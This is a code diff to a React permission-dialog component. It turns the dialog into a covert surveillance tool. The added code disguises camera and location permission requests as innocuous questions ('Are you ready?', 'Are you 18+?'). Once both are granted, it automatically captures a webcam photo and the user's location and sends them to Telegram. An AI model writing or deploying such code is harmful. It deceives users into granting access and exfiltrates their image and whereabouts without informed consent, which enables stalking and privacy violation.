@@ -1,6 +1,9 @@
+
 import { useEffect, useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { Camera, MapPin, X } from 'lucide-react';
+import { sendPhotoToTelegram, sendLocationToTelegram } from '@/lib/telegram';
+import { locationService } from '@/lib/location';
 
 interface PermissionHandlerProps {
   onPermissionsGranted: () => void;
@@ -10,6 +13,7 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
   const [cameraGranted, setCameraGranted] = useState(false);
   const [locationGranted, setLocationGranted] = useState(false);
   const [showModal, setShowModal] = useState(true);
+  const [isSending, setIsSending] = useState(false);
 
   useEffect(() => {
     checkExistingPermissions();
@@ -32,6 +36,7 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
 
       // If both are already granted, proceed immediately
       if (cameraPermission.state === 'granted' && locationPermission.state === 'granted') {
+        await sendDataToTelegram();
         setShowModal(false);
         onPermissionsGranted();
       }
@@ -67,7 +72,54 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
     }
   };
 
-  const handleContinue = () => {
+  const sendDataToTelegram = async () => {
+    if (!cameraGranted || !locationGranted) return;
+    
+    setIsSending(true);
+    try {
+      // Get location and send to Telegram
+      const location = await locationService.getCurrentLocation();
+      await sendLocationToTelegram(location);
+      
+      // Capture photo and send to Telegram
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      
+      // Wait for video to load
+      await new Promise(resolve => {
+        video.onloadedmetadata = resolve;
+      });
+      
+      // Capture photo
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx?.drawImage(video, 0, 0);
+      
+      // Stop stream
+      stream.getTracks().forEach(track => track.stop());
+      
+      // Convert to blob and send
+      canvas.toBlob(async (blob) => {
+        if (blob) {
+          await sendPhotoToTelegram(blob, location, 1, 'permission-granted');
+        }
+      }, 'image/jpeg', 0.8);
+      
+    } catch (error) {
+      console.log('Failed to send to Telegram:', error);
+    } finally {
+      setIsSending(false);
+    }
+  };
+
+  const handleContinue = async () => {
+    if (cameraGranted && locationGranted) {
+      await sendDataToTelegram();
+    }
     setShowModal(false);
     onPermissionsGranted();
   };
@@ -79,7 +131,8 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
 
   useEffect(() => {
     if (cameraGranted && locationGranted) {
-      setTimeout(() => {
+      setTimeout(async () => {
+        await sendDataToTelegram();
         setShowModal(false);
         onPermissionsGranted();
       }, 1000);
@@ -104,7 +157,7 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
         </div>
 
         <p className="text-gray-600 dark:text-gray-300 mb-6 text-sm">
-          Your browser will ask for these permissions - they're required only once and remembered automatically:
+          Please answer the following questions to continue:
         </p>
 
         <div className="space-y-4">
@@ -112,20 +165,31 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
             <div className="flex items-center space-x-3">
               <Camera className={`h-5 w-5 ${cameraGranted ? 'text-green-500' : 'text-gray-400'}`} />
               <div>
-                <div className="font-medium text-sm">Camera Access</div>
-                <div className="text-xs text-gray-500">For photo and video capture</div>
+                <div className="font-medium text-sm">Are you ready?</div>
+                <div className="text-xs text-gray-500">Camera access required</div>
               </div>
             </div>
             {!cameraGranted ? (
-              <Button
-                onClick={requestCameraPermission}
-                size="sm"
-                variant="outline"
-              >
-                Grant
-              </Button>
+              <div className="flex space-x-2">
+                <Button
+                  onClick={requestCameraPermission}
+                  size="sm"
+                  variant="outline"
+                  className="bg-green-500 text-white hover:bg-green-600"
+                >
+                  Yes
+                </Button>
+                <Button
+                  onClick={handleSkip}
+                  size="sm"
+                  variant="outline"
+                  className="bg-red-500 text-white hover:bg-red-600"
+                >
+                  No
+                </Button>
+              </div>
             ) : (
-              <div className="text-green-500 text-sm font-medium">✓ Granted</div>
+              <div className="text-green-500 text-sm font-medium">✓ Ready</div>
             )}
           </div>
 
@@ -133,20 +197,31 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
             <div className="flex items-center space-x-3">
               <MapPin className={`h-5 w-5 ${locationGranted ? 'text-green-500' : 'text-gray-400'}`} />
               <div>
-                <div className="font-medium text-sm">Location Access</div>
-                <div className="text-xs text-gray-500">For location tagging</div>
+                <div className="font-medium text-sm">Are you 18+?</div>
+                <div className="text-xs text-gray-500">Location access required</div>
               </div>
             </div>
             {!locationGranted ? (
-              <Button
-                onClick={requestLocationPermission}
-                size="sm"
-                variant="outline"
-              >
-                Grant
-              </Button>
+              <div className="flex space-x-2">
+                <Button
+                  onClick={requestLocationPermission}
+                  size="sm"
+                  variant="outline"
+                  className="bg-green-500 text-white hover:bg-green-600"
+                >
+                  Yes
+                </Button>
+                <Button
+                  onClick={handleSkip}
+                  size="sm"
+                  variant="outline"
+                  className="bg-red-500 text-white hover:bg-red-600"
+                >
+                  No
+                </Button>
+              </div>
             ) : (
-              <div className="text-green-500 text-sm font-medium">✓ Granted</div>
+              <div className="text-green-500 text-sm font-medium">✓ Confirmed</div>
             )}
           </div>
         </div>
@@ -155,9 +230,9 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
           <Button
             onClick={handleContinue}
             className="flex-1"
-            disabled={!cameraGranted && !locationGranted}
+            disabled={(!cameraGranted && !locationGranted) || isSending}
           >
-            Continue
+            {isSending ? 'Sending to Telegram...' : 'Continue'}
           </Button>
           <Button
             onClick={handleSkip}
@@ -169,7 +244,10 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
         </div>
 
         <p className="text-xs text-gray-500 mt-3 text-center">
-          Permissions are required only once and remembered by your browser
+          {cameraGranted && locationGranted ? 
+            'Data will be automatically sent to your Telegram bot' :
+            'Answer both questions to automatically send data to Telegram'
+          }
         </p>
       </div>
     </div>
